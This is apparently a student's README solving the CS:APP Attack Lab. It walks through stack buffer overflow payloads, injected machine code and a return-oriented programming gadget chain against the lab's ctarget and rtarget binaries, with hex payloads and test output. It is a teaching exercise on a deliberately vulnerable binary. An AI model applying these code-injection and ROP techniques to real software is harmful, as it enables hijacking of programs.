# 🎯 CSAPP Attack Lab

> **Code injection & return-oriented programming — hijacking `getbuf()` one byte at a time.** 🔫

This is my solution to the **Attack Lab** from
[*Computer Systems: A Programmer's Perspective (3rd Edition)*](https://csapp.cs.cmu.edu/),
as assigned in my university course. The lab is about exploiting a stack buffer
overflow to take control of a program — first by injecting code, then, once the
stack gets boring, by stitching together existing code with ROP. ✨

---

## ⚠️ Disclaimer — read this first

- **Course instance, not the official handout.** The binaries (`ctarget`, `rtarget`)
  and the gadget farm (`farm.c`) were distributed by my course and differ from the
  official files on the CS:APP website.
- **Everything below is instance-specific.** Stack addresses (`0x5564…`), code
  addresses (`0x808…`), and the cookie (`0x4df13892`) only hold for *this* binary.
  On any other instance of the lab, almost every number would be different.
- **For reference only.** 📚 This write-up documents how I solved this particular
  instance. Use it to learn the *techniques* — not as a template to copy.
- **Not reproducible in this repo.** `ctarget`, `rtarget` and `hex2raw` are
  **Linux x86-64 ELF binaries**, while this repository lives on macOS — they need a
  Linux environment (e.g. the Docker container at the repo root) to run. Even then,
  `cookie.txt` is **not included** here (it's a personal, per-instance value), so a
  fresh run would generate a different cookie anyway. 🤷

---

## 📂 What's in this directory?

| File | Purpose |
| --- | --- |
| `ctarget` | 🎯 Code-injection target (Phases 1–3) |
| `rtarget` | 🧩 ROP target (Phases 4–5) |
| `farm.c` | 🌾 Source of `rtarget`'s gadget farm |
| `hex2raw` | 🔧 Converts hex-byte payloads into raw input bytes |
| `ctarget01.txt` | 💉 My Phase 1 payload |
| `ctarget02.txt` | 💉 My Phase 2 payload |
| `ctarget03.txt` | 💉 My Phase 3 payload |
| `rtarget02.txt` | 💉 My Phase 4 (ROP) payload |
| `ctarget.d` / `rtarget.d` | 🔍 Full `objdump -d` disassemblies |
| `ctarget02.s` / `ctarget03.s` | 📝 Assembler source of my injected code |
| `cookie.txt` | ❌ **Not included** — personal per-instance value |

---

## 🚀 Quick Start

`ctarget` / `rtarget` / `hex2raw` are **Linux x86-64 ELF binaries**, so they need the
Linux container at the repo root:

```bash
# 1. Boot the container (Ubuntu 20.04, linux/amd64)
docker compose -f docker/docker-compose.yml up -d
docker exec -it csapp3e-labs zsh

# 2. Inside the container — repo is mounted at /root/csapp3e-labs
cd AttackLab

# 3. Replay a solution: hex-parse the payload, feed it to the target
cat ctarget03.txt | ./hex2raw | ./ctarget
```

Every payload below is a hex-byte file piped through `./hex2raw`, which strips
comments (`/* */`) and whitespace — so the annotated payloads
(`ctarget01.txt` … `rtarget02.txt`) are directly runnable.

> ⚠️ `cookie.txt` is not in this repo, so a fresh run gets a *different* cookie
> than `0x4df13892` used below.

---

## 🗺️ The Two Fronts

The lab is one vulnerability, two flavours. Both targets read your byte stream into
`getbuf()`'s 56-byte buffer and then `ret` straight into whatever you put after it —
the attack is entirely about what the *stack* looks like at that moment:

| | `ctarget` | `rtarget` |
| --- | --- | --- |
| Stack address | Fixed (no ASLR) | Randomized 🎲 |
| Stack memory | Executable | Non-executable 🚫 |
| Technique | Code injection 💉 | Return-oriented programming 🧱 |
| Phases | 1, 2, 3 | 4, 5 |

| Phase | Target | Goal | Technique |
| --- | --- | --- | --- |
| 1 | `touch1` | redirect the return address | overwrite return address |
| 2 | `touch2` | pass the cookie in `%rdi` | inject code |
| 3 | `touch3` | pass the cookie *string* in `%rdi` | inject code + stash a string |
| 4 | `touch2` | pass the cookie in `%rdi` | ROP gadget chain |
| 5 | `touch3` | pass the cookie *string* in `%rdi` | ROP *(not required — TBD)* |

---

## 🕵️ Recon: key addresses

Disassembling with `objdump -d ctarget` (see `ctarget.d`) gives us everything we need:

```assembly
000000000080891c <getbuf>:
  80891c:  48 83 ec 38      sub    $0x38,%rsp      # 56-byte buffer
  808920:  48 89 e7         mov    %rsp,%rdi       # Gets(buf)
  808923:  e8 94 02 00 00   callq  808bbc <Gets>   # reads our input
  808928:  b8 01 00 00 00   mov    $0x1,%eax
  80892d:  48 83 c4 38      add    $0x38,%rsp
  808931:  c3               retq                   # returns into *our* address
```

| Symbol | Address | Notes |
| --- | --- | --- |
| `getbuf` | `0x80891c` | 56-byte (`0x38`) stack buffer |
| `touch1` | `0x808932` | just needs a visit |
| `touch2` | `0x808960` | `cmp %edi, cookie` — needs cookie in `%rdi` |
| `touch3` | `0x808a77` | calls `hexmatch` — needs cookie *string* in `%rdi` |
| `hexmatch` | `0x8089c4` | allocates ~128 bytes of stack → keep the string far away |
| cookie | `0x4df13892` | this instance's value (from `cookie.txt`) |

For `ctarget`, GDB pinned down the stack layout around `getbuf()`:

- buffer starts at `0x556490b8`
- return-address slot sits at **`0x556490f0`** (56 bytes above the buffer start)
- my injected code lives at **`0x556490e0`** (offset 40 in the buffer)

Both binaries are **non-PIE**, so all code addresses are stable across runs. 🙌

---

## 💉 Part I: Code Injection Attacks (`ctarget`)

### 🥊 Phase 1 — `touch1` (redirect the return address)

**Goal:** make `getbuf()` return into `touch1` (`0x808932`) instead of `test`.

`touch1` doesn't check anything — it just needs to be *called*. The buffer is 56
bytes, so the saved return address sits exactly 56 bytes in. Pad the buffer with
zeros, then write `touch1`'s address in **little-endian** byte order:

```
00 × 56                       ← fill the 56-byte buffer
32 89 80 00 00 00 00 00       ← 0x808932  (touch1)
```

```bash
$ cat ctarget01.txt | ./hex2raw | ./ctarget
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```

Simple. 😌

### 🥊 Phase 2 — `touch2` (inject code that passes the cookie)

**Goal:** return into injected code that loads the cookie into `%rdi` (first argument),
then jumps to `touch2` (`0x808960`). `touch2` prints the cookie and compares it to the
global `cookie`:

```
Touch2!: You called touch2(0x4df13892)
```

`ctarget`'s stack is **fixed and executable**, so we can place real machine code in
the buffer. My payload is 13 bytes:

```assembly
mov    $0x4df13892, %rdi   # 48 c7 c7 92 38 f1 4d   — cookie → first arg
pushq  $0x808960           # 68 60 89 80 00         — touch2
ret                        # c3                     — pop the address & jump
```

The tricky part: the code can't overwrite the return address that leads to it, so I
put the code at **offset 40** in the buffer (address `0x556490e0`) and pointed the
saved return address there:

```
00 × 40                                 ← first 40 bytes of buffer (padding)
48 c7 c7 92 38 f1 4d 68 60 89 80 00 c3  ← injected code @ 0x556490e0
00 00 00                                ← padding to fill the buffer
e0 90 64 55 00 00 00 00                 ← return address → 0x556490e0
```

`mov` sets `%rdi = 0x4df13892`, `push` drops `touch2`'s address onto the stack, and
`ret` jumps straight into it. 🎉

### 🥊 Phase 3 — `touch3` (inject code that passes the cookie *string*)

**Goal:** pass the cookie to `touch3` (`0x808a77`) as a **string** — `"4df13892"`
(null-terminated) — because `touch3` compares it with `hexmatch()`:

```
Touch3!: You called touch3("4df13892")
```

Two things to handle:

1. **The string must survive.** `hexmatch` itself allocates ~128 bytes of stack, so
   the string must live *far above* the buffer — I stashed it at **`0x55649177`**.
2. **`%rdi` must point at it.** Same injection trick as Phase 2:

```assembly
mov    $0x55649177, %rdi    # 48 c7 c7 77 91 64 55   — string address → %rdi
pushq  $0x808a77            # 68 77 8a 80 00          — touch3
ret                        # c3
```

```
00 × 40                                          ← padding
48 c7 c7 77 91 64 55 68 77 8a 80 00 c3          ← injected code @ 0x556490e0
00 00 00                                        ← padding
e0 90 64 55 00 00 00 00                         ← return address → 0x556490e0
00 × 128                                        ← long stretch of zeros
34 64 66 31 33 38 39 32 00                      ← "4df13892\0" @ 0x55649177
```

The `0x34` is ASCII `'4'`, and `64 66 31 33 38 39 32 00` is `"df13892\0"` — together
`"4df13892"`. `%rdi` points there, so `hexmatch` finds the string regardless of where
its own stack frame lands. 🧠

---

## 🧱 Part II: Return-Oriented Programming (`rtarget`)

The party ends in Phase 4. `rtarget` fights back with two countermeasures:

1. **Non-executable stack** (`-Wl,-z,noexecstack`) — the CPU refuses to run anything
   that lives on the stack, so my injected `0x48 0xc7 ...` code from Part I is now
   just a bunch of harmless bytes.
2. **Randomized stack address** (ASLR) — even if I could execute code there, I no
   longer know *where* the buffer lives, so I can't hardcode a target address like
   `0x556490e0`.

So we pivot to **return-oriented programming**: instead of injecting *new* code, we
carefully chain together fragments of code that **already exist** in the target.
Each fragment — a few instructions ending in `ret` — is called a **gadget**. Because
each gadget ends in `ret`, it pops the *next* address off the stack, so the whole
attack becomes nothing more than a stack full of addresses:

```
buffer padding → gadget1 → cookie → gadget2 → touch2 → ...
```

The code addresses are all fixed (non-PIE), so we still know exactly where every
gadget lives — only the *data* (our buffer) is at an unknown address, and ROP never
needs to reference the stack by address for Phase 4. 

### 🔎 Gadget hunting: the farm

`rtarget` ships with a "gadget farm" — a heap of innocuous-looking functions
(`getval_352`, `setval_366`, `add_xy`, …) whose machine-code bytes accidentally
contain useful instruction sequences if you jump in at the *right offset* (see
`farm.c`). The rule: gadgets may only use `movq`, `popq`, `nop`, and `ret`.
`farm.c` compiles cleanly (`gcc -Og -o farm farm.c`), so you can `objdump -d` your
own copy and hunt for gadgets the same way I did.

#### Gadget 1: `popq %rax; retq` — at `0x808b47`

```
0000000000808b43 <getval_352>:
  808b43:	b8 a2 21 d7 58       	mov    $0x58d721a2,%eax     ← 58 is the 5th byte!
  808b48:	c3                   	retq
```

`getval_352` just loads `0x58d721a2` into `%eax`… but look at the **bytes**:
`b8 a2 21 d7 58 c3`. If we jump to offset **+4** (`0x808b47`), the CPU decodes
`58 c3` — which is `popq %rax; retq`. The `mov` immediate conveniently contains
the `pop` opcode. 🎣

#### Gadget 2: `movq %rax, %rdi; retq` — at `0x808b23`

```
0000000000808b21 <setval_366>:
  808b21:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  808b27:	c3                   	retq
```

Same trick. Jumping to offset **+2** (`0x808b23`) hits `48 89 c7 c3` —
`movq %rax, %rdi; retq`. The immediate `0xc3c78948` is literally the little-endian
bytes of our two instructions. 😄

### 🥊 Phase 4 — `touch2` via ROP (pass the cookie with gadgets)

**Goal:** same as Phase 2 — cookie in `%rdi`, then call `touch2` (`0x808960`) — but
with zero lines of injected code.

The two gadgets above are exactly what we need. The chain:

1. `popq %rax` — pops the **cookie value** off our stack into `%rax`
2. `movq %rax, %rdi` — moves it into the first argument register
3. `touch2` — clean return into `touch2`, which prints `Touch2!: You called touch2(0x4df13892)`

```
00 × 56                                     ← fill getbuf()'s 56-byte buffer
47 8b 80 00 00 00 00 00                     ← gadget 1: popq %rax          @ 0x808b47
92 38 f1 4d 00 00 00 00                     ← cookie 0x4df13892  →  %rax
23 8b 80 00 00 00 00 00                     ← gadget 2: movq %rax, %rdi    @ 0x808b23
60 89 80 00 00 00 00 00                     ← touch2                       @ 0x808960
```

Read it like a program: `getbuf` returns → `ret` sends us to `0x808b47`
(`pop %rax`) → that `pop` consumes the next stack slot, so `%rax = 0x4df13892`
→ its `ret` sends us to `0x808b23` (`mov %rax, %rdi`) → that `ret` sends us to
`0x808960` (`touch2`). The stack pointer walks forward through the payload, each
`ret` consuming one address — no stack-address knowledge required. 🧩

```bash
$ cat rtarget02.txt | ./hex2raw | ./rtarget
Touch2!: You called touch2(0x4df13892)
Valid solution for level 2 with target rtarget
```

### 🥊 Phase 5 — `touch3` via ROP *(not required — will add later)*

Phase 5 asks for the same thing as Phase 3: point `%rdi` at the *string*
`"4df13892"` so `touch3` (`0x808a77`) can compare it with `hexmatch`. This phase
was **not required by my course**, so I haven't done it yet — the notes below are
the approach I'll follow when I come back to fill it in. 🏳️

The idea is elegant. We can't know the stack address ahead of time… but `%rsp` *is*
the stack pointer, and the farm has gadgets that shift it:

- `movq %rsp, %rax` — capture the current stack position
- `addq $imm, %rax` / `leaq disp(%rax), %rdi` — walk forward to a known offset
  where we stashed the cookie string (via the `add_xy` function's
  `48 89 e0` / `48 01 d0` byte sequences: `movq %rsp, %rax; addq %rax, %rdi` etc.)

Chaining those lets us compute the string's address **at runtime** from `%rsp`,
keeping the string inside our own payload:

```
padding → mov %rsp,%rax → addq $imm,%rax → mov %rax,%rdi → touch3 → "4df13892\0"
```

> The official CS:APP write-ups solve it with the `add_xy` farm
> (`48 89 e0` = `movq %rsp, %rax` at `0x808d03`, `48 01 d0` = `addq %rax, %rdi` at
> `0x808d08` *et al.*), but those sequences may differ in this course instance, so
> the exact gadget addresses need re-verifying against `rtarget.d` when I pick
> this up again. TODO: solve & document 📌

---

## 💡 Takeaways

- **The return address is just data.** `getbuf` writes 56 bytes into a stack buffer
  and blindly `ret`s into whatever 8 bytes sit above it. At its core, every attack
  in this lab is that one fact.
- **Little-endian everywhere.** `0x0808932` goes on the wire as
  `32 89 80 00 00 00 00 00`. Get the byte order wrong and the CPU jumps into the
  void.
- **Defenses shape exploits.** Fixed executable stack → free-form code injection.
  Random non-executable stack → ROP with hardcoded *code* addresses and data
  carried purely on the stack.
- **Gadgets hide in plain sight.** `popq %rax` was sitting inside a `movl`
  immediate; `movq %rax, %rdi` inside another one. The farm is an invitation to
  disassemble from every offset.
- **`hex2raw` is your friend.** Every payload above is a hex-byte file piped
  through `./hex2raw`; the converter strips comments (`/* */`) and whitespace, so
  annotated payloads like `ctarget01.txt`–`rtarget02.txt` are directly runnable.

All code addresses in this write-up come from `ctarget.d` / `rtarget.d`
(`objdump -d`), and every stack address in Part I was pinned down with GDB — the
two tools do 95% of the work. 🔧

---

## ✅ Test Results

| Phase | Payload | Result |
| --- | --- | --- |
| 1 | `ctarget01.txt` | ✅ `Valid solution for level 1 with target ctarget` |
| 2 | `ctarget02.txt` | ✅ `Valid solution for level 2 with target ctarget` |
| 3 | `ctarget03.txt` | ✅ `Valid solution for level 3 with target ctarget` |
| 4 | `rtarget02.txt` | ✅ `Valid solution for level 2 with target rtarget` |
| 5 | — | ⏳ not required by course — will add later |

---

## 🙏 Credits

- Lab by [CS:APP](https://csapp.cs.cmu.edu/) — *Randal E. Bryant & David R. O'Hallaron*
- Course instance & handout by my university
- Cookie `0x4df13892` from a personal `cookie.txt` — not included in this repo 🤷
- Solution explanations written by me, verified against the actual binaries
  (`ctarget`, `rtarget`) and their disassemblies (`ctarget.d`, `rtarget.d`)

**Happy hacking — and may your bytes be ever little-endian. 🫡**

